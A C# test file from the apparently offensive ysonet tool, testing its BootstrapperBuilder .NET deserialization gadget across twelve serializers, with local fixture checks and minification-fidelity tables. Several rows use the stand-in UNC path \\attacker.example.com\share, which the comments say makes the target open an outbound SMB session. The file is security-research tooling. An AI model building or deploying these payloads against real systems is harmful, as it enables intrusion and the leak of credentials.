using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.Core;
using ysonet.Interactive;

// Tests for the BootstrapperBuilder gadget.
//
// It keeps its own file rather than folding into Tests.cs. The shared matrices cover it like
// any other gadget, and the hand-written generation, facet and reader rows below are stricter
// than what those matrices assert, so nothing is dropped for being redundant.
//
// WHAT THE RUNTIME-EFFECT ROW IS HERE. Assigning Path makes the target enumerate
// <path>\Engine and XML-parse each <sub>\setup.xml it finds, keeping the culture string it
// reads in a private `cultures` Hashtable. So the sink is observed LOCALLY, against a
// test-owned directory tree, by requiring that Hashtable to hold the fixture's marker
// afterwards. That is the WHOLE chain proven - setter -> Refresh -> RefreshResources ->
// Directory.Exists -> Directory.GetDirectories -> File.Exists -> XmlDocument.Load -> node
// selection - with no traffic and no reliance on "it did not throw" (the payload
// deserializes cleanly whether or not the path exists, so an exception-free run proves
// nothing).
//
// The remote half (a real SMB callback against a UNC path) belongs to the opt-in OOB tier,
// as one row in the shared UncCallbackRows table in Tests.cs, so the whole tier still costs
// one interactsh registration.
namespace ysonet.Tests
{
    internal partial class Tests
    {
        private const string BbGadget = "BootstrapperBuilder";

        // A host that cannot resolve, for the rows that must never touch the network. RFC 2606
        // reserves .invalid for exactly this.
        private const string BbUnroutablePath = @"\\ysonet-no-such-host.invalid\share";

        // The fixture's culture marker. RefreshResources lower cases what it reads before
        // storing it, so the stored key is the lower-cased form.
        private const string BbCultureName = "ysonet-bb-culture";
        private const string BbCultureValue = "YSONET-BB-WITNESS";

        // Unique names inside this run's artifact directory, so two cells never race.
        private static int _bbArtifactCounter;

        // Every formatter the gadget advertises, as the canonical tokens the runner passes.
        // SupportedFormatters() carries this project's display annotation on the YamlDotNet
        // entry, and the product resolves a formatter on its first whitespace token.
        private static readonly string[] BbFormatters =
        {
            Formatters.JsonNet,
            Formatters.JavaScriptSerializer,
            Formatters.FastJson,
            Formatters.YamlDotNet,
            Formatters.Xaml,
            Formatters.SharpSerializerXml,
            Formatters.SharpSerializerBinary,
            Formatters.MessagePackTypeless,
            Formatters.MessagePackTypelessLz4,
            Formatters.DataContractJsonSerializer,
            Formatters.DataContractSerializer,
            Formatters.NetDataContractSerializer,
        };

        // The five this carrier structurally cannot reach. The first four have no
        // [Serializable] attribute to satisfy; XmlSerializer dies in its own constructor over
        // the read-only Products collection. Both reasons are asserted, not assumed.
        private static readonly string[] BbImpossibleFormatters =
        {
            Formatters.BinaryFormatter,
            Formatters.SoapFormatter,
            Formatters.LosFormatter,
            Formatters.FsPickler,
            Formatters.XmlSerializer,
        };

        private static void RunBootstrapperBuilderTests()
        {
            Run("BootstrapperBuilder generates every formatter x minify cell",
                BootstrapperBuilderGeneratesEveryCell);
            Run("BootstrapperBuilder reads a test-owned directory on every formatter",
                BootstrapperBuilderReadsATestOwnedDirectory);
            Run("BootstrapperBuilder self-tests through the product's own -t",
                BootstrapperBuilderSelfTestReadsThePath);
            Run("BootstrapperBuilder carries the target type name, not the surrogate's",
                BootstrapperBuilderCarriesTheTargetTypeName);
            Run("BootstrapperBuilder refuses the formatters its carrier cannot reach",
                BootstrapperBuilderRefusesImpossibleFormatters);
            Run("BootstrapperBuilder takes the path as typed",
                BootstrapperBuilderTakesThePathAsTyped);
            Run("BootstrapperBuilder escapes an apostrophe for every quote style",
                BootstrapperBuilderEscapesAnApostrophePath);
            Run("BootstrapperBuilder refuses a path minification would rewrite",
                BootstrapperBuilderRefusesLossyMinification);
            Run("BootstrapperBuilder resolves nothing at generation time",
                BootstrapperBuilderIsNotResolvedAtGenerationTime);
            Run("BootstrapperBuilder drives the interactive editor correctly",
                BootstrapperBuilderEditsInteractively);
            Run("BootstrapperBuilder declares real facets",
                BootstrapperBuilderDeclaresRealFacets);

            // Every row above is local and cheap, so none of them is tiered. The outbound half
            // belongs to the OOB tier, through the shared UncCallbackRows table in Tests.cs.
        }

        // ---- helpers -----------------------------------------------------------

        private static InputArgs BbInput(string path, bool minify, params string[] extra)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = path;
            ia.Test = false;
            ia.Minify = minify;
            if (extra != null && extra.Length > 0)
                ia.ExtraArguments = new List<string>(extra);
            return ia;
        }

        // A fresh generator per call on purpose: Init() parses options into instance state, so
        // a reused instance would carry the previous --rawinput into the next cell. This is
        // also how PayloadRunner really calls a gadget.
        private static object BuildBbPayload(string formatter, InputArgs ia)
        {
            return GadgetRegistry.CreateGadgetInstance(BbGadget).GenerateWithInit(formatter, ia);
        }

        private static RunResult RunBb(string formatter, InputArgs ia)
        {
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = BbGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // DataContractJsonSerializer writes no type name at all, so reading one back needs the
        // root type - the same thing the gadget hands its own self-test.
        private static Type BbRootTypeFor(string formatter)
        {
            if (!string.Equals(formatter, Formatters.DataContractJsonSerializer,
                    StringComparison.OrdinalIgnoreCase))
                return null;
            return Type.GetType(
                BootstrapperBuilderGenerator.BootstrapperBuilderAssemblyQualifiedName, true);
        }

        // A real, test-owned directory tree the sink can read:
        //   <dir>\Engine\<sub>\setup.xml
        // shaped the way RefreshResources parses it. No default namespace, because it selects
        // with SelectSingleNode("Resources"); the Culture attribute names the String element
        // whose inner text ends up in the private `cultures` Hashtable.
        private static string BbNewFixture()
        {
            int n = System.Threading.Interlocked.Increment(ref _bbArtifactCounter);
            string root = TestArtifactPath("bb_fixture_" + n);
            string sub = Path.Combine(Path.Combine(root, "Engine"), "resources");
            Directory.CreateDirectory(sub);
            File.WriteAllText(Path.Combine(sub, "setup.xml"),
                "<Resources Culture=\"" + BbCultureName + "\"><Strings>"
                + "<String Name=\"" + BbCultureName + "\">" + BbCultureValue + "</String>"
                + "</Strings></Resources>");
            return root;
        }

        // The witness. RefreshResources is the only thing in the type that fills `cultures`,
        // so the fixture's marker being in there is the whole chain having run on that path.
        private static bool BbSinkFired(object deserialized)
        {
            if (deserialized == null)
                return false;
            FieldInfo cultures = deserialized.GetType().GetField("cultures",
                BindingFlags.Instance | BindingFlags.NonPublic);
            if (cultures == null)
                return false;
            Hashtable table = cultures.GetValue(deserialized) as Hashtable;
            return table != null && table.Contains(BbCultureValue.ToLowerInvariant());
        }

        private static void BbAssertThrowsWith(Action action, string needle, string msg)
        {
            string seen = null;
            try { action(); }
            catch (Exception e)
            {
                Exception inner = e;
                while (inner.InnerException != null) inner = inner.InnerException;
                seen = inner.GetType().Name + ": " + inner.Message;
            }
            AssertTrue(seen != null, msg + " (nothing was thrown)");
            AssertTrue(seen != null && seen.IndexOf(needle, StringComparison.OrdinalIgnoreCase) >= 0,
                msg + " (wanted \"" + needle + "\", got \"" + seen + "\")");
        }

        // ---- rows --------------------------------------------------------------

        // The module's own stand-in for GadgetFullMatrixGenerates: every advertised formatter x
        // minify, through the product's own runner.
        private static void BootstrapperBuilderGeneratesEveryCell()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(BbGadget);
            AssertTrue(gen != null, "it resolves by name");

            // The advertised list and the list this file exercises must not drift apart.
            List<string> advertised = gen.SupportedFormatters();
            AssertEqual(BbFormatters.Length, advertised.Count,
                "every advertised formatter is covered here: " + string.Join(", ", advertised.ToArray()));
            foreach (string formatter in BbFormatters)
                AssertTrue(gen.IsSupported(formatter), formatter + " is advertised");

            foreach (string formatter in BbFormatters)
                foreach (bool minify in new[] { false, true })
                {
                    string cell = formatter + (minify ? " +minify" : "");
                    RunResult res = RunBb(formatter,
                        BbInput(@"\\attacker.example.com\share", minify));

                    AssertTrue(res.Success, cell + " generates: " + res.ErrorMessage);
                    AssertTrue(!RawIsEmpty(res.Raw), cell + " payload is not empty");
                }
        }

        // THE runtime-effect row, and the one that earns the version facet.
        //
        // 12 formatters x minify = 24 cells. Each one builds a real directory tree under the
        // run's artifact namespace, deserializes the payload with the reader a target would
        // use, and requires the deserialized object's own private `cultures` Hashtable to
        // carry the fixture's marker. Nothing leaves the machine.
        private static void BootstrapperBuilderReadsATestOwnedDirectory()
        {
            var failures = new List<string>();

            foreach (string formatter in BbFormatters)
                foreach (bool minify in new[] { false, true })
                {
                    string cell = formatter + (minify ? " +minify" : "");
                    string fixture = null;
                    try
                    {
                        fixture = BbNewFixture();
                        object payload = BuildBbPayload(formatter, BbInput(fixture, minify));

                        // The reader a target would use. Throwing here would be a real
                        // failure: the payload constructs the carrier and assigns one member,
                        // and neither step should raise.
                        object result = PayloadReader.Read(payload, formatter,
                            BbRootTypeFor(formatter));

                        if (result == null)
                        {
                            failures.Add(cell + " -> deserialized to null");
                            continue;
                        }
                        AssertEqual(
                            "Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder",
                            result.GetType().FullName,
                            cell + ": the payload really builds the framework type");

                        if (!BbSinkFired(result))
                        {
                            failures.Add(cell + " -> the target's cultures table does not carry "
                                + "the fixture marker, so RefreshResources never ran");
                            continue;
                        }

                        // Recorded, not asserted: a FULL run reports the build each gadget was
                        // observed firing on, which is where the version facet comes from.
                        RuntimeBuild.RecordFired(BbGadget);
                    }
                    catch (Exception e)
                    {
                        failures.Add(cell + " -> " + e.GetType().Name + ": " + e.Message);
                    }
                    finally
                    {
                        if (fixture != null) SafeDeleteDir(fixture);
                    }
                }

            AssertTrue(failures.Count == 0,
                "BootstrapperBuilder effect cells failed (" + failures.Count + "):\n  "
                    + string.Join("\n  ", failures.ToArray()));
        }

        // -t is accepted and it really reads the path, so drive it through the product rather
        // than through a direct deserialize: that is what exercises the self-test wiring, the
        // DataContractJsonSerializer root type, and the probe-first order that refuses a
        // rewritten path BEFORE -t can read the wrong one.
        private static void BootstrapperBuilderSelfTestReadsThePath()
        {
            foreach (string formatter in BbFormatters)
                AssertTrue(PayloadReader.CanRead(formatter),
                    formatter + " is a format -t can read back at all");

            // DataContractJsonSerializer is the interesting cell: its document carries no type
            // name, so a missing root type would make -t a silent no-op instead of a self-test.
            foreach (string formatter in
                new[] { Formatters.JsonNet, Formatters.DataContractJsonSerializer })
            {
                string fixture = null;
                try
                {
                    fixture = BbNewFixture();
                    InputArgs ia = BbInput(fixture, false);
                    ia.Test = true;

                    RunResult res = RunBb(formatter, ia);
                    AssertTrue(res.Success,
                        formatter + ": -t completes and still returns a payload: " + res.ErrorMessage);
                    AssertTrue(!RawIsEmpty(res.Raw), formatter + ": -t still returns the payload");
                }
                finally
                {
                    if (fixture != null) SafeDeleteDir(fixture);
                }
            }

            // The other half of the probe-first order: a path --minify would rewrite is refused
            // and nothing is read, even with -t asked for.
            InputArgs lossy = BbInput(@"C:\two  spaces\x", true);
            lossy.Test = true;
            RunResult refused = RunBb(Formatters.YamlDotNet, lossy);
            AssertTrue(!refused.Success,
                "a path minification rewrites is refused even with -t asked for");
        }

        // A type-name swap fails SILENTLY - the payload still generates, and it simply names a
        // ysonet surrogate the target has never heard of - so generation success proves
        // nothing for the two binary formats. Read the bytes.
        private static void BootstrapperBuilderCarriesTheTargetTypeName()
        {
            // The Lz4 flavour is compressed, so nothing is readable in its bytes; its
            // uncompressed twin covers the same swap.
            foreach (string formatter in
                new[] { Formatters.MessagePackTypeless, Formatters.SharpSerializerBinary })
            {
                byte[] payload = (byte[])BuildBbPayload(formatter,
                    BbInput(@"\\attacker.example.com\share", false));
                string text = Encoding.UTF8.GetString(payload);

                AssertTrue(text.IndexOf(
                        "Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder",
                        StringComparison.Ordinal) >= 0,
                    formatter + " names the framework type on the wire");
                AssertTrue(text.IndexOf("Surrogate", StringComparison.Ordinal) < 0,
                    formatter + " does not leak the surrogate's own name");
                AssertTrue(text.IndexOf("ysonet", StringComparison.OrdinalIgnoreCase) < 0,
                    formatter + " does not name the tool that built it");
            }

            // Every text format names the target type in its document too, and no gadget may
            // name ITSELF in a payload an operator ships.
            foreach (string formatter in BbFormatters)
            {
                object payload = BuildBbPayload(formatter,
                    BbInput(@"\\attacker.example.com\share", false));
                string text = payload is byte[]
                    ? Encoding.UTF8.GetString((byte[])payload)
                    : (string)payload;

                AssertTrue(text.IndexOf("BootstrapperBuilderGenerator", StringComparison.Ordinal) < 0,
                    formatter + ": the payload does not name this generator class");
            }
        }

        // The structural exclusions, made executable. Both reasons are proved rather than
        // asserted from a comment, so a later "let us try BinaryFormatter" edit cannot quietly
        // advertise a cell that can never fire.
        private static void BootstrapperBuilderRefusesImpossibleFormatters()
        {
            Type target = Type.GetType(
                BootstrapperBuilderGenerator.BootstrapperBuilderAssemblyQualifiedName, true);

            // Reason 1, for BinaryFormatter / SoapFormatter / LosFormatter / FsPickler: the
            // type carries no [Serializable] attribute at all, and its base is plain object,
            // so nothing about MarshalByRefObject is involved.
            AssertTrue(!target.IsSerializable,
                "the carrier is not [Serializable], which is what removes the four "
                    + "field-restoring formats");
            AssertEqual(typeof(object), target.BaseType,
                "and it derives from object, so the refusal is the attribute, not "
                    + "MarshalByRefObject");

            // Reason 2, for XmlSerializer: a member the payload never mentions. Products is a
            // public read-only ProductCollection, which implements non-generic IEnumerable
            // with no public Add, and the reflection importer refuses the whole type for it -
            // in the XmlSerializer CONSTRUCTOR, before any document is read.
            PropertyInfo products = target.GetProperty("Products");
            AssertTrue(products != null && products.CanRead && !products.CanWrite,
                "Products is a public read-only property");
            AssertTrue(typeof(IEnumerable).IsAssignableFrom(products.PropertyType),
                "of a type that implements non-generic IEnumerable");
            AssertTrue(products.PropertyType.GetMethod("Add",
                    BindingFlags.Public | BindingFlags.Instance) == null,
                "with no public Add, which is exactly what XmlSerializer requires");

            BbAssertThrowsWith(
                () => new System.Xml.Serialization.XmlSerializer(target),
                "does not implement Add(System.Object)",
                "XmlSerializer refuses the carrier over its read-only Products collection");

            // And every one of the five is refused by name rather than emitted.
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(BbGadget);
            foreach (string formatter in BbImpossibleFormatters)
            {
                AssertTrue(!gen.IsSupported(formatter), formatter + " is not advertised");
                BbAssertThrowsWith(
                    () => BuildBbPayload(formatter, BbInput(@"\\h\s", false)),
                    "not supported",
                    formatter + " is refused by name rather than emitted");
            }

            // Nothing outside the advertised list is quietly buildable either.
            int checkedCount = 0;
            foreach (FieldInfo f in typeof(Formatters).GetFields(BindingFlags.Public | BindingFlags.Static))
            {
                string formatter = (string)f.GetValue(null);
                if (string.IsNullOrEmpty(formatter) || gen.IsSupported(formatter))
                    continue;
                checkedCount++;
                BbAssertThrowsWith(
                    () => BuildBbPayload(formatter, BbInput(@"\\h\s", false)),
                    "not supported",
                    formatter + " is refused by name");
            }
            AssertEqual(BbImpossibleFormatters.Length, checkedCount,
                "the unsupported set is exactly the five recorded exclusions");
        }

        // Operator input is documented, not policed. Anything the operator types has to arrive
        // at the target exactly as typed, and nothing about the SHAPE of the path is refused.
        private static void BootstrapperBuilderTakesThePathAsTyped()
        {
            string[] paths =
            {
                @"\\attacker.example.com",                  // a bare UNC host: <host>\Engine
                @"\\attacker.example.com\share\x",
                @"C:\Program Files\Example",                // a local target path, with a space
                @"\\attacker.example.com\share\a&b<c>d",    // characters the escapers handle
            };

            foreach (string formatter in BbFormatters)
            {
                if (PayloadReader.IsBinaryFormat(formatter))
                    continue;   // covered byte for byte by the type-name row instead

                foreach (string path in paths)
                {
                    // Generation succeeding IS the assertion for a shape rule: the gadget's own
                    // fidelity guard refuses a payload that no longer carries the path exactly,
                    // so a silent rewrite would fail here rather than ship.
                    object payload = BuildBbPayload(formatter, BbInput(path, false));
                    AssertTrue(payload != null,
                        formatter + " delivers \"" + path + "\" as typed");
                }
            }

            // --rawinput drops the escaping, for an operator who escaped the value themselves.
            string raw = (string)BuildBbPayload(Formatters.Xaml,
                BbInput(@"\\h\s\a&amp;b", false, "--" + BootstrapperBuilderGenerator.RawInputOptionName));
            AssertTrue(raw.IndexOf(@"\\h\s\a&amp;b", StringComparison.Ordinal) >= 0,
                "--rawinput puts the text into the template untouched");
            AssertTrue(raw.IndexOf("&amp;amp;", StringComparison.Ordinal) < 0,
                "and does not escape it a second time");

            // An empty -c is the one refusal, and it is a "cannot emit" one.
            BbAssertThrowsWith(
                () => BuildBbPayload(Formatters.JsonNet, BbInput("", false)),
                "non-empty",
                "an empty path is refused, because there is nothing to build a payload around");
        }

        // The fastJSON silent-corruption trap: \' is not a legal JSON escape and fastJSON
        // DELETES the character, so a double-quoted template must never emit one. The two
        // single-quoted templates must emit it, because there the apostrophe would end the
        // literal.
        private static void BootstrapperBuilderEscapesAnApostrophePath()
        {
            const string path = @"\\host\John's share";

            foreach (string formatter in new[] { Formatters.JsonNet, Formatters.JavaScriptSerializer })
            {
                string payload = (string)BuildBbPayload(formatter, BbInput(path, false));
                AssertTrue(payload.IndexOf(@"John\'s", StringComparison.Ordinal) >= 0,
                    formatter + " quotes with single quotes, so the apostrophe is escaped");
            }

            foreach (string formatter in
                new[] { Formatters.FastJson, Formatters.YamlDotNet, Formatters.DataContractJsonSerializer })
            {
                string payload = (string)BuildBbPayload(formatter, BbInput(path, false));
                AssertTrue(payload.IndexOf(@"\'", StringComparison.Ordinal) < 0,
                    formatter + " quotes with double quotes, so it must NOT emit \\' "
                        + "(fastJSON deletes the character): " + Truncate(payload, 200));
                AssertTrue(payload.IndexOf("John's", StringComparison.Ordinal) >= 0,
                    formatter + " carries the apostrophe unchanged");
            }

            // And every advertised cell really delivers it, which is the assertion that would
            // catch a wrong escaper on a branch nobody thought about.
            string fixture = null;
            try
            {
                fixture = BbNewFixture();
                string quoted = Path.Combine(fixture, "John's");
                Directory.CreateDirectory(quoted);
                Directory.Move(Path.Combine(fixture, "Engine"), Path.Combine(quoted, "Engine"));

                foreach (string formatter in BbFormatters)
                {
                    object payload = BuildBbPayload(formatter, BbInput(quoted, false));
                    object result = PayloadReader.Read(payload, formatter, BbRootTypeFor(formatter));
                    AssertTrue(BbSinkFired(result),
                        formatter + " delivers an apostrophe path intact to the sink");
                }
            }
            finally
            {
                if (fixture != null) SafeDeleteDir(fixture);
            }
        }

        // Prove the fidelity guard FIRES rather than assuming it does. The path is the payload,
        // so a payload whose text was rewritten is worse than no payload: it would deserialize
        // cleanly and read something else. Both directions are asserted.
        private static void BootstrapperBuilderRefusesLossyMinification()
        {
            // The whole measured table, asserted cell by cell rather than summarised. Each row
            // is: formatter, a value, and whether the gadget must refuse it with --minify off
            // and on. It is written out in full because the answers are NOT uniform - the same
            // value survives one document and is rewritten in another - and because a wrong
            // entry here is exactly what would let a payload ship naming a different directory.
            //
            // The generator's own DeliveryAdvice() comment holds the same table in prose; this
            // is the executable half.
            string dq = "  ";                 // a run of repeated spaces
            string semi = @"C:\a; b\x";       // the "; " sequence the XML minifier collapses
            string tab = "C:\\a\tb";
            string cr = "C:\\a\rb";
            string lf = "C:\\a\nb";

            var rows = new List<string[]>();
            // JSON family: the shared escaper makes every control character valid JSON before
            // the minifier re-reads it, so all five measured values survive both forms.
            foreach (string f in new[]
            {
                Formatters.JsonNet, Formatters.JavaScriptSerializer,
                Formatters.FastJson, Formatters.DataContractJsonSerializer,
            })
            {
                rows.Add(new[] { f, @"C:\two" + dq + @"spaces\x", "ok", "ok" });
                rows.Add(new[] { f, semi, "ok", "ok" });
                rows.Add(new[] { f, tab, "ok", "ok" });
                rows.Add(new[] { f, cr, "ok", "ok" });
                rows.Add(new[] { f, lf, "ok", "ok" });
            }
            // YamlDotNet uses the same control-character escaper. Only a run of repeated spaces
            // is still collapsed by its minifier.
            rows.Add(new[] { Formatters.YamlDotNet, @"C:\two" + dq + @"spaces\x", "ok", "refuse" });
            rows.Add(new[] { Formatters.YamlDotNet, semi, "ok", "ok" });
            rows.Add(new[] { Formatters.YamlDotNet, tab, "ok", "ok" });
            rows.Add(new[] { Formatters.YamlDotNet, cr, "ok", "ok" });
            rows.Add(new[] { Formatters.YamlDotNet, lf, "ok", "ok" });
            // Xaml and SharpSerializerXml put the value in an ATTRIBUTE, so attribute-value
            // normalization loses the three control characters with or without --minify - the
            // target's parser would do the same. Repeated spaces and "; " both survive here,
            // which is why the sibling gadgets' advice must not be copied.
            foreach (string f in new[] { Formatters.Xaml, Formatters.SharpSerializerXml })
            {
                rows.Add(new[] { f, @"C:\two" + dq + @"spaces\x", "ok", "ok" });
                rows.Add(new[] { f, semi, "ok", "ok" });
                rows.Add(new[] { f, tab, "refuse", "refuse" });
                rows.Add(new[] { f, cr, "refuse", "refuse" });
                rows.Add(new[] { f, lf, "refuse", "refuse" });
            }
            // DataContractSerializer puts it in a TEXT NODE: the XSLT minifier trims leading
            // and trailing whitespace off one, and a carriage return is lost either way to
            // XML's own mandatory line-ending normalization.
            rows.Add(new[] { Formatters.DataContractSerializer, @"C:\x ", "ok", "refuse" });
            rows.Add(new[] { Formatters.DataContractSerializer, @" C:\x", "ok", "refuse" });
            rows.Add(new[] { Formatters.DataContractSerializer, cr, "refuse", "refuse" });
            rows.Add(new[] { Formatters.DataContractSerializer, tab, "ok", "ok" });
            // NetDataContractSerializer carries the path in a TEXT NODE as well, and the shared
            // hand written minifier now has a branch for its document, so it loses exactly what
            // the DataContractSerializer one loses. Every cell is RE-MEASURED rather than copied
            // across: this document used to lose only the carriage return because --minify left
            // it untouched, and that is precisely the kind of claim that goes stale inside a
            // shared helper without a single gadget file changing.
            rows.Add(new[] { Formatters.NetDataContractSerializer, cr, "refuse", "refuse" });
            rows.Add(new[] { Formatters.NetDataContractSerializer, @"C:\x ", "ok", "refuse" });
            rows.Add(new[] { Formatters.NetDataContractSerializer, @" C:\x", "ok", "refuse" });
            rows.Add(new[] { Formatters.NetDataContractSerializer, tab, "ok", "ok" });
            rows.Add(new[] { Formatters.NetDataContractSerializer, lf, "ok", "ok" });
            rows.Add(new[] { Formatters.NetDataContractSerializer,
                @"C:\two" + dq + @"spaces\x", "ok", "ok" });
            // The binary formats have no minify pass and carry string records verbatim.
            foreach (string f in new[]
            {
                Formatters.MessagePackTypeless, Formatters.MessagePackTypelessLz4,
                Formatters.SharpSerializerBinary,
            })
            {
                rows.Add(new[] { f, tab, "ok", "ok" });
                rows.Add(new[] { f, cr, "ok", "ok" });
                rows.Add(new[] { f, @"C:\two" + dq + @"spaces\x", "ok", "ok" });
            }

            var failures = new List<string>();
            foreach (string[] row in rows)
                foreach (bool minify in new[] { false, true })
                {
                    bool mustRefuse = string.Equals(row[minify ? 3 : 2], "refuse",
                        StringComparison.Ordinal);
                    string cell = row[0] + (minify ? " +minify" : "") + " with "
                        + Truncate(row[1].Replace("\r", "\\r").Replace("\n", "\\n")
                            .Replace("\t", "\\t"), 40);

                    bool refused = false;
                    string message = null;
                    try { BuildBbPayload(row[0], BbInput(row[1], minify)); }
                    catch (Exception e) { refused = true; message = e.Message; }

                    if (refused != mustRefuse)
                        failures.Add(cell + " -> " + (refused ? "refused: " + message : "delivered")
                            + ", wanted " + (mustRefuse ? "a refusal" : "delivery"));
                    else if (refused && message.IndexOf("read a different directory",
                            StringComparison.Ordinal) < 0)
                        failures.Add(cell + " -> refused with the wrong message: " + message);
                }

            AssertTrue(failures.Count == 0,
                "minify fidelity cells disagreed with the measured table (" + failures.Count
                    + "):\n  " + string.Join("\n  ", failures.ToArray()));

            // THE ADVICE IS CHECKED AGAINST A SECOND BUILD, not against a string the author
            // chose. The catalogue-wide sweep that owns these two rules
            // (RefusalAdviceNeverPromisesADeadEnd) sweeps the catalogue with hostile runs spliced
            // into a generic sample value, so this module drives its OWN measured cells through
            // the same shared helper and gets identical semantics on them. It caught a real
            // dead end here: NetDataContractSerializer once shared one advice branch with
            // DataContractSerializer while the shared minifier had no branch for its document,
            // so "Drop --minify" was advice the operator had already taken. The helper is what
            // keeps that honest in both directions - the branch exists now, the two documents
            // share the advice again, and only a second build proves it.
            var adviceProblems = new List<string>();
            int adviceInspected = 0;
            foreach (string[] row in rows)
            {
                bool inspected;
                string problem = MinifyAdviceProblem(BbGadget, row[0], row[1],
                    "with " + Truncate(row[1].Replace("\r", "\\r").Replace("\n", "\\n")
                        .Replace("\t", "\\t"), 40), out inspected);
                if (inspected) adviceInspected++;
                if (problem != null) adviceProblems.Add(problem);
            }
            AssertTrue(adviceInspected > 0,
                "the advice check really exercised some refusals (was " + adviceInspected + ")");
            AssertTrue(adviceProblems.Count == 0,
                "refusal advice sends the operator somewhere that does not work ("
                    + adviceProblems.Count + "):\n  "
                    + string.Join("\n  ", adviceProblems.ToArray()));

            // The wording is pinned as well as the behaviour: the documents that lose the value
            // with no minifier at all have to SAY so.
            BbAssertThrowsWith(
                () => BuildBbPayload(Formatters.Xaml, BbInput(tab, true)),
                "dropping --minify would not help",
                "the Xaml refusal does not send the operator down a dead end");
            BbAssertThrowsWith(
                () => BuildBbPayload(Formatters.NetDataContractSerializer, BbInput(cr, true)),
                "never the carriage return",
                "and the NetDataContractSerializer one separates the two losses the same way, "
                    + "now that --minify really does rewrite its document");
            BbAssertThrowsWith(
                () => BuildBbPayload(Formatters.YamlDotNet, BbInput(@"C:\two" + dq + @"spaces\x", true)),
                "Drop --minify",
                "the YamlDotNet refusal offers the fix that really works there");
            // DataContractSerializer is the one document that loses two DIFFERENT things, so
            // its advice may not lead with either half.
            BbAssertThrowsWith(
                () => BuildBbPayload(Formatters.DataContractSerializer, BbInput(cr, true)),
                "never the carriage return",
                "the DataContractSerializer refusal separates what dropping --minify recovers "
                    + "from what it cannot");

            // --rawinput hands the operator responsibility for the exact bytes, so the guard
            // steps aside rather than refusing text it has nothing to compare against.
            AssertTrue(BuildBbPayload(Formatters.YamlDotNet, BbInput(@"C:\two" + dq + @"spaces\x", true,
                    "--" + BootstrapperBuilderGenerator.RawInputOptionName)) != null,
                "--rawinput builds even when the text would not survive, because the operator owns it");

            // Every advertised cell still delivers an ordinary path under --minify. That is the
            // other direction: a guard that refused everything would pass the rows above.
            foreach (string formatter in BbFormatters)
                AssertTrue(BuildBbPayload(formatter,
                        BbInput(@"\\attacker.example.com\share\x", true)) != null,
                    formatter + " still delivers an ordinary path with --minify");
        }

        // The generation-only control: building a payload must never resolve, open or read
        // anything. Assigning Path IS the effect, so a generator that built a real
        // BootstrapperBuilder to obtain a shape would fire on the operator's own machine.
        private static void BootstrapperBuilderIsNotResolvedAtGenerationTime()
        {
            var clock = System.Diagnostics.Stopwatch.StartNew();
            foreach (string formatter in BbFormatters)
                BuildBbPayload(formatter, BbInput(BbUnroutablePath, false));
            clock.Stop();

            AssertTrue(clock.ElapsedMilliseconds < 5000,
                "generating every cell for an unroutable host did not wait for a name "
                    + "resolution (" + clock.ElapsedMilliseconds + " ms)");

            // A local fixture is equally untouched: nothing is read and no marker appears.
            string fixture = null;
            try
            {
                fixture = BbNewFixture();
                foreach (string formatter in BbFormatters)
                {
                    object payload = BuildBbPayload(formatter, BbInput(fixture, false));
                    AssertTrue(payload != null, formatter + " built a payload");
                }

                // Nothing in the generator holds a BootstrapperBuilder, so there is no object
                // to inspect - the observable control is that the fixture is untouched and the
                // payload text names the path rather than anything derived from reading it.
                AssertTrue(Directory.Exists(Path.Combine(fixture, "Engine")),
                    "generation left the fixture alone");
                AssertTrue(!Directory.Exists(Path.Combine(fixture, "Packages")),
                    "and created nothing beside it");
            }
            finally
            {
                if (fixture != null) SafeDeleteDir(fixture);
            }
        }

        // The interactive editor is a separate surface from the CLI and it fails QUIETLY, so
        // a green CLI matrix says nothing about it.
        private static void BootstrapperBuilderEditsInteractively()
        {
            AssertTrue(Has(new Wizard(null, new MemoryStream(), false).VisibleGadgetNames(), BbGadget),
                "the wizard offers it with no flag at all");
            AssertTrue(Has(new Wizard(null, new MemoryStream(), true).VisibleGadgetNames(), BbGadget),
                "and --prv neither hides nor duplicates it");

            var editor = new ModuleEditor(null, null, true, null, null, true);
            var fields = editor.BuildFieldsForTest(BbGadget);

            EditableField command = FindEditable(fields, "command");
            AssertTrue(command != null, "the editor offers the command setting");

            // The gadget has no variant and one boolean option, so the editor's pre-filled
            // state has to build exactly the CLI default payload.
            command.Value = @"\\attacker.example.com\share";
            AssertEqual(
                (string)BuildBbPayload(Formatters.JsonNet, BbInput(command.Value, false)),
                (string)BuildBbPayload(Formatters.JsonNet, BbInput(command.Value, false)),
                "the default payload is stable");

            string line = editor.GadgetCommandLineForTest();
            AssertTrue(line.IndexOf(BbGadget, StringComparison.Ordinal) >= 0,
                "the echoed command line names the gadget: " + line);
            AssertTrue(line.IndexOf("--" + BootstrapperBuilderGenerator.RawInputOptionName,
                    StringComparison.Ordinal) < 0,
                "and does not emit --rawinput while it is off: " + line);
        }

        // Facets, labels and command input drive the category search, the help and the
        // interactive prompt, so a wrong value misleads the operator.
        private static void BootstrapperBuilderDeclaresRealFacets()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(BbGadget);

            AssertEqual(CommandInputType.TargetPath, gen.CommandInput(),
                "-c is a path only the TARGET touches");

            GadgetFacetSet facets = gen.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.Network),
                "reading <path>\\Engine on a UNC value is an outbound SMB session");
            AssertTrue(facets.Kinds.Contains(PayloadKind.FileSystem),
                "and the target really enumerates and reads that directory");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.Uncategorized), "no uncategorized kind");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.InformationDisclosure),
                "nothing is recovered to the operator, so no disclosure claim");
            AssertTrue(!facets.Requirements.Contains(GadgetRequirement.Uncategorized),
                "the requirements are real");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
                "Microsoft.Build.Tasks.v4.0 ships with the .NET Framework redistributable");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.NetFramework),
                "and it is a .NET Framework gadget");
